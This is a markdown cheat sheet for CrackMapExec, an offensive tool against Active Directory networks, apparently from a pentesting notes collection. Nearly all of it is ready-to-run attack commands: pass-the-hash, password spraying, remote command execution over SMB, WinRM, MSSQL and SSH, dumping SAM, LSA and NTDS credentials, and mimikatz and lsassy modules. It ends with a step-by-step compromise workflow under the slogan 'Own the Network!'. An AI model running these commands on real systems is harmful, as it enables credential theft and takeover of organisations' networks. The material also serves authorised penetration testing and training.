# 🗡️ CrackMapExec - AD Swiss Army Knife

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec - A Swiss Army Knife for Pentesting
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Table of Contents

- [What is CrackMapExec](#-what-is-crackmapexec)
- [Installation](#-installation)
- [SMB Protocol](#-smb-protocol)
- [WinRM Protocol](#-winrm-protocol)
- [LDAP Protocol](#-ldap-protocol)
- [MSSQL Protocol](#-mssql-protocol)
- [SSH Protocol](#-ssh-protocol)
- [Modules](#-modules)
- [Password Spraying](#-password-spraying)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is CrackMapExec

**CrackMapExec** (CME) is a post-exploitation tool for network assessments. It supports:

- 🖥️ **SMB** - Shares, sessions, execution
- 🔧 **WinRM** - PowerShell remoting
- 📂 **LDAP** - AD enumeration
- 🗄️ **MSSQL** - SQL Server attacks
- 🐧 **SSH** - Linux targets
- 💉 **Pass-the-Hash** - Credential reuse

### Features

| Feature | Description |
|---------|-------------|
| **Multi-protocol** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Parallel execution** | Attack multiple targets |
| **Credential DB** | Track compromised creds |
| **Modules** | Extensible with custom modules |
| **Output formats** | Multiple output options |

---

## 🚀 Installation

### Kali Linux

```bash
# Install via apt
sudo apt update
sudo apt install crackmapexec

# Or via pipx (recommended)
pipx install crackmapexec
```

### Using pipx

```bash
# Install pipx first
sudo apt install pipx
pipx ensurepath

# Install CME
pipx install crackmapexec
```

### Verify

```bash
crackmapexec --help
crackmapexec smb --help
```

---

## 🖥️ SMB Protocol

### Basic Enumeration

```bash
# Check if hosts are alive
cme smb 10.10.10.0/24

# Enumerate with credentials
cme smb 10.10.10.10 -u user -p password

# Domain authentication
cme smb 10.10.10.10 -u user -p password -d domain.local

# Local authentication
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

```bash
# SMB with NTLM hash
cme smb 10.10.10.10 -u user -H NTLMHASH

# Full LM:NTLM hash
cme smb 10.10.10.10 -u user -H LM:NTLM

# Spray hash across network
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Share Enumeration

```bash
# List shares
cme smb 10.10.10.10 -u user -p password --shares

# Spider shares for files
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# List files recursively
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### User Enumeration

```bash
# List users via RPC
cme smb 10.10.10.10 -u user -p password --users

# List groups
cme smb 10.10.10.10 -u user -p password --groups

# List logged-on users
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Get user SIDs
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Command Execution

```bash
# Execute command
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell execution
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Different execution methods
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Credential Dumping

```bash
# Dump SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Dump LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Dump NTDS.dit (requires DA on DC)
cme smb DC01.domain.local -u admin -p password --ntds

# Dump NTDS with specific method
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### SMB Signing

```bash
# Check SMB signing (for relay attacks)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## 🔧 WinRM Protocol

### Basic Usage

```bash
# Check WinRM access
cme winrm 10.10.10.10 -u user -p password

# Check multiple targets
cme winrm 10.10.10.0/24 -u user -p password

# With hash
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Command Execution

```bash
# Execute command
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Execute script
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Credential Dumping

```bash
# SAM dump via WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# LSA secrets
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

## 📂 LDAP Protocol

### Enumeration

```bash
# Basic LDAP query
cme ldap DC01.domain.local -u user -p password

# List users
cme ldap DC01 -u user -p password --users

# List groups
cme ldap DC01 -u user -p password --groups

# AS-REP roastable users
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Kerberoastable users
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Password Policy

```bash
# Get password policy
cme ldap DC01 -u user -p password --password-policy
```

### User Attributes

```bash
# Get user descriptions
cme ldap DC01 -u user -p password -M get-desc-users

# Get specific attributes
cme ldap DC01 -u user -p password --admin-count
```

---

## 🗄️ MSSQL Protocol

### Basic Usage

```bash
# Connect to MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Windows authentication
cme mssql 10.10.10.10 -u user -p password -d domain.local

# With hash
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Command Execution

```bash
# Execute via xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Enable xp_cmdshell first
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Execute command
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

## 🐧 SSH Protocol

### Basic Usage

```bash
# SSH check
cme ssh 10.10.10.10 -u root -p password

# Multiple targets
cme ssh 10.10.10.0/24 -u user -p password

# With key file
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Command Execution

```bash
# Execute command
cme ssh 10.10.10.10 -u root -p password -x "id"

# Multiple commands
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

## 🧩 Modules

### List Modules

```bash
# List all modules
cme smb -L
cme winrm -L
cme ldap -L

# Module help
cme smb -M mimikatz --options
```

### Popular Modules

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (dump LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# GPP passwords
cme smb DC01 -u user -p password -M gpp_password

# GPP AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Bloodhound Collection

```bash
# Collect BloodHound data
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

## 🔓 Password Spraying

### Basic Spraying

```bash
# Single password against users
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Multiple passwords
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Don't brute (try each combination)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Network Spraying

```bash
# Spray across network
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# From file of targets
cme smb targets.txt -u admin -p password --continue-on-success
```

### Lockout Awareness

```bash
# Check password policy first
cme ldap DC01 -u user -p password --password-policy

# Output:
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

## 💾 Database

### CME Database

```bash
# View credentials
cmedb

# Inside cmedb:
creds           # List stored credentials
hosts           # List scanned hosts
```

### Export Data

```bash
# Output formats
cme smb 10.10.10.10 -u user -p password --log log.txt

# JSON output
cme smb 10.10.10.10 -u user -p password --json
```

---

## 📊 Quick Reference

### Authentication Methods

| Method | Option |
|--------|--------|
| Password | `-p password` |
| NTLM Hash | `-H HASH` |
| AES Key | `--aesKey KEY` |
| Kerberos | `-k` |
| Local Auth | `--local-auth` |

### Protocols

| Protocol | Port | Use Case |
|----------|------|----------|
| SMB | 445 | File shares, execution |
| WinRM | 5985/5986 | PowerShell remoting |
| LDAP | 389/636 | AD enumeration |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Linux systems |

### Common Flags

| Flag | Description |
|------|-------------|
| `-u` | Username (or file) |
| `-p` | Password (or file) |
| `-H` | NTLM hash |
| `-d` | Domain |
| `-x` | Command (cmd) |
| `-X` | Command (PowerShell) |
| `--shares` | List shares |
| `--users` | List users |
| `--sam` | Dump SAM |
| `--lsa` | Dump LSA |
| `--ntds` | Dump NTDS |

### Output Markers

| Marker | Meaning |
|--------|---------|
| `[+]` | Success |
| `[-]` | Failure |
| `[*]` | Info |
| `(Pwn3d!)` | Admin access confirmed |

### Typical Workflow

```bash
# 1. Network scan
cme smb 10.10.10.0/24

# 2. Password spray
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Check admin access
cme smb 10.10.10.0/24 -u user -p password

# 4. Dump credentials
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Use found creds
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Resources

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [CME Modules](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Related Cheatsheets
- [BloodHound](../BloodHound/README.md)
- [Impacket](../Impacket/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

<p align="center">
  <b>🗡️ Own the Network!</b><br>
  <i>CrackMapExec - The pentester's Swiss army knife</i>
</p>
